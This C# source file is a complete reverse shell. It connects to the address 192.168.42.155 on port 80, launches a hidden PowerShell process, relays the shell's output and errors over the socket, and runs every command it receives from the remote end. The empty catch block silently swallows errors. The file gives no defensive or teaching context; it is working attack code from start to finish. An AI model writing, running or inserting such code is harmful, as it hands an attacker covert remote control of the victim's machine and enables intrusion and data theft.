using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;
using System.Threading.Tasks;

namespace Sigma
{
    class Program
    {
        static void Main(string[] args)
        {
           
            string remoteHost = "192.168.42.155";
            int remotePort = 80;

            try
            {
                using (TcpClient client = new TcpClient(remoteHost, remotePort))
                {
                    using (NetworkStream stream = client.GetStream())
                    {
                        // Start an interactive PowerShell process with redirected I/O
                        Process process = new Process();
                        process.StartInfo.FileName = "powershell.exe";
                        process.StartInfo.CreateNoWindow = true;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardInput = true;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.Start();

                        // Improved asynchronous reading of standard output using BaseStream
                        Task.Run(() =>
                        {
                            byte[] buffer = new byte[1024];
                            int bytesRead;
                            while ((bytesRead = process.StandardOutput.BaseStream.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                // Directly send the bytes read to the network stream
                                stream.Write(buffer, 0, bytesRead);
                                stream.Flush();
                            }
                        });

                        // Improved asynchronous reading of standard error using BaseStream
                        Task.Run(() =>
                        {
                            byte[] buffer = new byte[1024];
                            int bytesRead;
                            while ((bytesRead = process.StandardError.BaseStream.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                stream.Write(buffer, 0, bytesRead);
                                stream.Flush();
                            }
                        });

                        // Read commands from the network stream and write to the process's standard input
                        StreamReader netReader = new StreamReader(stream);
                        StreamWriter processWriter = process.StandardInput;
                        while (true)
                        {
                            string command = netReader.ReadLine();
                            if (command == null)
                            {
                                break; // Connection closed
                            }
                            processWriter.WriteLine(command);
                            processWriter.Flush();
                        }

                        process.WaitForExit();
                    }
                }
            }
            catch (Exception ex)
            {
                // Optionally, log or handle exceptions as needed
            }
        }
    }
}
